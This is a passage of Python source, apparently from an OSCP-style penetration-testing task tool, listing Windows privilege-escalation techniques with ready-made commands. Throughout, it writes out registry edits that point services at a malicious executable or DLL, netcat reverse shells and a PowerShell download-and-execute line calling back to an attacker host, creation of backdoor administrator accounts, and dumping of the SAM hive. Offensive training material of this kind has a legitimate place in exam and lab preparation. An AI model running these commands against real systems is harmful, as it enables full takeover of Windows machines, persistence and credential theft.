                        'description': 'Find writable service registry keys (modify ImagePath for privesc)',
                        'flag_explanations': {
                            '-u': 'Suppress errors (cleaner output)',
                            '-v': 'Verbose output (show permissions)',
                            '-w': 'Show only writable keys',
                            '-q': 'Omit banner',
                            '-k': 'Registry key mode',
                            'HKLM\\...\\Services': 'Service configuration registry'
                        },
                        'success_indicators': [
                            'Writable service keys listed',
                            'KEY_ALL_ACCESS or KEY_WRITE permissions shown',
                            'Non-admin user has write access (exploit condition)'
                        ],
                        'failure_indicators': [
                            'No writable keys found',
                            'AccessChk not available (download from Sysinternals)',
                            'All services read-only for current user'
                        ],
                        'next_steps': [
                            'Identify writable service: accesschk.exe shows KEY_WRITE',
                            'Modify ImagePath: reg add HKLM\\...\\Services\\<service> /v ImagePath /t REG_EXPAND_SZ /d "C:\\temp\\evil.exe" /f',
                            'Restart service: net stop <service> && net start <service> (or wait for reboot)',
                            'Service runs evil.exe as SYSTEM'
                        ],
                        'alternatives': [
                            'PowerShell: Get-Acl "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\*" | where {$_.Access -match "Allow.*FullControl"}',
                            'Manual: regedit → right-click service key → Permissions'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'EXPLOIT'],
                        'notes': 'Download AccessChk: https://live.sysinternals.com/accesschk.exe. Writable ImagePath = SYSTEM execution.'
                    }
                },
                {
                    'id': f'performance-subkey-dll-injection-{target}',
                    'name': 'Performance Subkey DLL Injection (Windows 7/2008 R2)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Inject DLL via writable Performance subkey (RpcEptMapper, Dnscache services)',
                        'manual_steps': [
                            '1. Check Windows version: Windows 7 or Server 2008 R2 vulnerable',
                            '2. Vulnerable services: RpcEptMapper, Dnscache',
                            '3. Check writable Performance key: accesschk.exe -wvu HKLM\\System\\CurrentControlSet\\Services\\RpcEptMapper\\Performance',
                            '4. If writable: reg add HKLM\\...\\RpcEptMapper\\Performance /v Library /t REG_SZ /d "C:\\temp\\evil.dll" /f',
                            '5. Restart service: net stop RpcEptMapper && net start RpcEptMapper',
                            '6. DLL loaded as SYSTEM (DllMain executes)'
                        ],
                        'success_indicators': [
                            'Performance\\Library registry value created',
                            'Service restarts successfully',
                            'evil.dll loaded into service process (Process Monitor)',
                            'DllMain code executes as SYSTEM'
                        ],
                        'failure_indicators': [
                            'Windows version not vulnerable (Windows 8+ patched)',
                            'Performance key not writable',
                            'Service fails to start (DLL error)',
                            'DLL architecture mismatch (32-bit vs 64-bit)'
                        ],
                        'alternatives': [
                            'Writable ImagePath abuse (more reliable)',
                            'Unquoted service path exploitation',
                            'Service binary replacement'
                        ],
                        'tags': ['OSCP:LOW', 'EXPLOIT', 'LEGACY'],
                        'notes': 'Specific to Windows 7/2008 R2. Rare in OSCP but documented for completeness. Modern Windows patched.'
                    }
                }
            ]
        }

    def _get_potato_extended_tasks(self, target: str, context: str) -> Dict[str, Any]:
        """Modern Potato exploits (9 variants)"""
        return {
            'id': f'potato-extended-{target}',
            'name': 'Potato Exploits (Modern Variants)',
            'type': 'parent',
            'children': [
                {
                    'id': f'roguepotato-{target}',
                    'name': 'RoguePotato (Windows 10 1809+/Server 2019+)',
                    'type': 'command',
                    'metadata': {
                        'command': 'RoguePotato.exe -r <ATTACKER_IP> -e "cmd.exe /c whoami" -l 9999',
                        'description': 'Escalate SeImpersonate to SYSTEM via OXID resolver redirect',
                        'flag_explanations': {
                            '-r': 'Remote IP (your attacking machine with socat OXID resolver)',
                            '-e': 'Command to execute with SYSTEM token',
                            '-l': 'Local port for COM marshalling (default 9999)'
                        },
                        'success_indicators': [
                            '[+] Named pipe listening',
                            '[+] DCOM OXID Resolver redirected to attacker',
                            'Command output shows: NT AUTHORITY\\SYSTEM'
                        ],
                        'failure_indicators': [
                            'OXID resolver not reachable (check socat on attacker)',
                            'Firewall blocking port 135 or 9999',
                            'SeImpersonate privilege not held'
                        ],
                        'next_steps': [
                            'Setup attacker OXID resolver: socat tcp-listen:135,reuseaddr,fork tcp:<TARGET_IP>:9999',
                            'Get reverse shell: -e "C:\\temp\\nc.exe <LHOST> <LPORT> -e cmd.exe"',
                            'Add admin user: -e "cmd /c net user backdoor P@ss! /add && net localgroup administrators backdoor /add"'
                        ],
                        'alternatives': [
                            'PrintSpoofer (no external OXID resolver needed)',
                            'GodPotato (universal, no dependencies)',
                            'JuicyPotatoNG (Windows 11/Server 2022 specific)'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'QUICK_WIN'],
                        'notes': 'Download: https://github.com/antonioCoco/RoguePotato. Requires SeImpersonate. Windows 10 1809+ / Server 2019+.'
                    }
                },
                {
                    'id': f'printspoofer-{target}',
                    'name': 'PrintSpoofer (Windows 10/Server 2019+)',
                    'type': 'command',
                    'metadata': {
                        'command': 'PrintSpoofer.exe -i -c cmd',
                        'description': 'Abuse Print Spooler service to escalate SeImpersonate to SYSTEM',
                        'flag_explanations': {
                            '-i': 'Interact with spawned process (show command prompt)',
                            '-c': 'Command to execute with SYSTEM token (cmd = command prompt)'
                        },
                        'success_indicators': [
                            '[+] Named pipe listening',
                            '[+] CreateProcessAsUser OK',
                            'Command prompt opens as NT AUTHORITY\\SYSTEM'
                        ],
                        'failure_indicators': [
                            'Print Spooler service not running (sc query Spooler)',
                            'Access denied creating named pipe',
                            'SeImpersonate privilege not held'
                        ],
                        'next_steps': [
                            'Get reverse shell: -c "C:\\temp\\nc.exe <LHOST> <LPORT> -e cmd.exe"',
                            'Add backdoor user: -c "net user backdoor P@ssw0rd! /add"',
                            'Dump SAM/SYSTEM: -c "reg save HKLM\\SAM C:\\temp\\sam.hive"'
                        ],
                        'alternatives': [
                            'GodPotato.exe -cmd "cmd /c whoami"',
                            'SweetPotato.exe -p cmd.exe -a "/c whoami"',
                            'RoguePotato.exe (if WinRM disabled)'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'QUICK_WIN'],
                        'notes': 'Download: https://github.com/itm4n/PrintSpoofer. Requires SeImpersonate + Print Spooler running.'
                    }
                },
                {
                    'id': f'godpotato-{target}',
                    'name': 'GodPotato (Universal: Windows 8-11)',
                    'type': 'command',
                    'metadata': {
                        'command': 'GodPotato.exe -cmd "cmd /c whoami"',
                        'description': 'Universal Potato exploit (no service dependencies)',
                        'flag_explanations': {
                            '-cmd': 'Command to execute with SYSTEM token'
                        },
                        'success_indicators': [
                            'Command output: NT AUTHORITY\\SYSTEM',
                            'No service dependencies required',
                            'Works on Windows 8, 10, 11, Server 2012-2022'
                        ],
                        'failure_indicators': [
                            'SeImpersonate privilege not held',
                            'Windows version too old (pre-Windows 8)'
                        ],
                        'next_steps': [
                            'Reverse shell: -cmd "cmd /c C:\\temp\\nc.exe <LHOST> <LPORT> -e cmd.exe"',
                            'Add admin: -cmd "cmd /c net user backdoor P@ss! /add & net localgroup administrators backdoor /add"',
                            'Execute PowerShell: -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(\'http://<LHOST>/shell.ps1\')"'
                        ],
                        'alternatives': [
                            'PrintSpoofer (if Print Spooler available)',
                            'JuicyPotatoNG (Windows 11/Server 2022 specific)'
                        ],
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'QUICK_WIN', 'RELIABLE'],
                        'notes': 'Download: https://github.com/BeichenDream/GodPotato. Most universal Potato variant. No dependencies.'
                    }
                },
                {
                    'id': f'sharpefspotato-{target}',
                    'name': 'SharpEfsPotato (MS-EFSR RPC abuse)',
                    'type': 'command',
                    'metadata': {
                        'command': 'SharpEfsPotato.exe -p C:\\Windows\\system32\\cmd.exe -a "/c whoami"',
                        'description': 'Abuse MS-EFSR RPC to escalate SeImpersonate to SYSTEM',
                        'flag_explanations': {
                            '-p': 'Program to execute with SYSTEM token',
                            '-a': 'Arguments to pass to program',
                            '-pipe': 'Named pipe (optional, default varies by method)'
                        },
                        'success_indicators': [
                            '[+] Abuse EFSR RPC',
                            'Command executes as SYSTEM',
                            'Output: NT AUTHORITY\\SYSTEM'
                        ],
                        'failure_indicators': [
                            'MS-EFSR service not available',
                            'SeImpersonate privilege not held',
                            'Named pipe creation failed'
                        ],
                        'next_steps': [
                            'Try different pipes: -pipe lsarpc, efsrpc, samr, lsass, netlogon',
                            'Execute reverse shell: -p C:\\temp\\nc.exe -a "<LHOST> <LPORT> -e cmd.exe"'
                        ],
                        'alternatives': [
                            'EfsPotato (C++ version)',
                            'GodPotato (more universal)'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'notes': 'Download: https://github.com/bugch3ck/SharpEfsPotato. Multiple pipe options for reliability.'
                    }
                },
                {
                    'id': f'dcompotato-{target}',
                    'name': 'DCOMPotato (Server 2022 compatible)',
                    'type': 'command',
                    'metadata': {
                        'command': 'DCOMPotato.exe -d "cmd /c whoami"',
                        'description': 'Abuse PrinterNotify/McpManagement COM objects for SYSTEM',
                        'flag_explanations': {
                            '-d': 'Command to execute with SYSTEM token'
                        },
                        'success_indicators': [
                            'DCOM object instantiated',
                            'Command executes as SYSTEM'
                        ],
                        'failure_indicators': [
                            'DCOM disabled',
                            'COM objects not available',
                            'SeImpersonate not held'
                        ],
                        'next_steps': [
                            'Reverse shell: -d "C:\\temp\\nc.exe <LHOST> <LPORT> -e cmd.exe"'
                        ],
                        'alternatives': [
                            'GodPotato',
                            'JuicyPotatoNG'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'notes': 'Compatible with Server 2022. Uses PrinterNotify/McpManagement COM.'
                    }
                },
                {
                    'id': f'sigmapotato-{target}',
                    'name': 'SigmaPotato (2024-2025 fork, in-memory)',
                    'type': 'command',
                    'metadata': {
                        'command': 'SigmaPotato.exe -c "cmd /c whoami"',
                        'description': 'Latest Potato fork with in-memory execution and .NET reflection',
                        'flag_explanations': {
                            '-c': 'Command to execute',
                            '-m': 'In-memory execution (no disk writes)',
                            '-r': '.NET reflection bypass'
                        },
                        'success_indicators': [
                            'In-memory execution successful',
                            'SYSTEM token obtained',
                            'No disk artifacts'
                        ],
                        'failure_indicators': [
                            'SeImpersonate not held',
                            '.NET not available'
                        ],
                        'next_steps': [
                            'PowerShell reverse shell: -c "powershell -ep bypass -c IEX(...)"'
                        ],
                        'alternatives': [
                            'GodPotato (more stable)',
                            'PrintSpoofer'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'STEALTH'],
                        'notes': 'Latest fork (2024-2025). In-memory execution. May be less stable than GodPotato.'
                    }
                },
                {
                    'id': f'juicypotato-legacy-{target}',
                    'name': 'JuicyPotato (Legacy: pre-Windows 10 1809)',
                    'type': 'command',
                    'metadata': {
                        'command': 'JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\\Windows\\system32\\cmd.exe -a "/c whoami" -t *',
                        'description': 'Legacy Potato exploit (Windows Server 2008-2016, Windows 7-10 1803)',
                        'flag_explanations': {
                            '-l': 'COM listening port (pick unused port)',
                            '-c': 'CLSID to abuse (varies by Windows version/build)',
                            '-p': 'Program to execute',
                            '-a': 'Arguments',
                            '-t': 'CreateProcess method: * (try both), t (CreateProcessWithToken), u (CreateProcessAsUser)'
                        },
                        'success_indicators': [
                            '[+] authresult 0',
                            'CLSID works: {GUID};NT AUTHORITY\\SYSTEM',
                            '[+] CreateProcessWithTokenW OK'
                        ],
                        'failure_indicators': [
                            'Windows 10 1809+ / Server 2019+ (patched, use RoguePotato/PrintSpoofer)',
                            'CLSID doesn\'t work (try different CLSIDs from http://ohpe.it/juicy-potato/CLSID/)',
                            'COM port already in use'
                        ],
                        'next_steps': [
                            'Find working CLSID: Download GetCLSID.ps1, test_clsid.bat',
                            'Try OS-specific CLSIDs from: http://ohpe.it/juicy-potato/CLSID/',
                            'Reverse shell: -a "/c C:\\temp\\nc.exe <LHOST> <LPORT> -e cmd.exe"'
                        ],
                        'alternatives': [
                            'RoguePotato (Windows 10 1809+)',
                            'PrintSpoofer (Windows 10/Server 2019+)',
                            'GodPotato (universal)'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'LEGACY'],
                        'notes': 'Download: https://github.com/ohpe/juicy-potato. Legacy only. Broken on Windows 10 1809+ / Server 2019+.'
                    }
                },
                {
                    'id': f'juicypotatong-{target}',
                    'name': 'JuicyPotatoNG (Windows 11/Server 2022)',
                    'type': 'command',
                    'metadata': {
                        'command': 'JuicyPotatoNG.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c whoami"',
                        'description': 'Modern JuicyPotato for Windows 11/Server 2022 (INTERACTIVE trick)',
                        'flag_explanations': {
                            '-t': 'CreateProcess method: * (try both)',
                            '-p': 'Program to execute',
                            '-a': 'Arguments',
                            '-b': 'Bruteforce all CLSIDs (testing only, spawns many processes)',
                            '-s': 'Scan for COM port not filtered by Windows Defender Firewall',
                            '-i': 'Interactive console (only with CreateProcessAsUser)'
                        },
                        'success_indicators': [
                            'CLSID {A9819296-E5B3-4E67-8226-5E72CE9E1FB7} works on Win11/Server2022',
                            'Command executes as SYSTEM'
                        ],
                        'failure_indicators': [
                            'Windows 10 (use RoguePotato/PrintSpoofer instead)',
                            'INTERACTIVE trick blocked (Microsoft patched Jan 2023)'
                        ],
                        'next_steps': [
                            'Reverse shell: -p "C:\\temp\\nc.exe" -a "<LHOST> <LPORT> -e cmd.exe"',
                            'Bruteforce CLSIDs: -b (WARNING: spawns many processes)'
                        ],
                        'alternatives': [
                            'GodPotato (more universal)',
                            'PrintSpoofer (if Print Spooler available)'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'notes': 'Download: https://github.com/antonioCoco/JuicyPotatoNG. Windows 11/Server 2022 specific. INTERACTIVE trick may be patched.'
                    }
                },
                {
                    'id': f'fullpowers-{target}',
                    'name': 'FullPowers (restore stripped privileges)',
                    'type': 'command',
                    'metadata': {
                        'command': 'FullPowers.exe -c "C:\\temp\\RoguePotato.exe -r <ATTACKER_IP> -e cmd.exe -l 9999" -z',
                        'description': 'Restore SeImpersonate/SeAssignPrimaryToken for service accounts',
                        'flag_explanations': {
                            '-c': 'Command to execute with restored privileges',
                            '-z': 'Non-interactive mode (spawns and exits)'
                        },
                        'success_indicators': [
                            '[+] Successfully created scheduled task',
                            'Privileges restored: SeImpersonate, SeAssignPrimaryToken',
                            'Follow-up Potato exploit succeeds'
                        ],
                        'failure_indicators': [
                            'Task Scheduler not accessible',
                            'Privileges already present (not needed)',
                            'Task execution blocked'
                        ],
                        'next_steps': [
                            'Chain with Potato: FullPowers.exe -c "GodPotato.exe -cmd whoami" -z',
                            'Verify privileges after: whoami /priv'
                        ],
                        'alternatives': [
                            'Manual Task Scheduler abuse',
                            'COM hijacking (if privileges completely stripped)'
                        ],
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'CHAIN'],
                        'notes': 'Download: https://github.com/itm4n/FullPowers. Use when SeImpersonate stripped from service account.'
                    }
                }
            ]
        }
